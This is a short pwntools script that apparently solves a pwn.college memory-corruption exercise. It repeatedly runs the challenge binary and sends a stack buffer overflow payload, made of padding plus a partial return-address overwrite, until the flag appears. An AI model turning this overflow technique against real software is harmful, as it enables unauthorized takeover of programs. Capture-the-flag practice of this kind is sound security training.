from pwn import *

while True:
    p = process('/challenge/babymem_level8.1')

    p.recvuntil('Payload size:')
    # 128+8+2
    p.sendline(b'138')

    #payload = b'a' * 120 + b'\x56'+b'\x22' 
    payload = b'\x00' + b'a' * 135 + p32(0x205E)
    #p.recvline('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break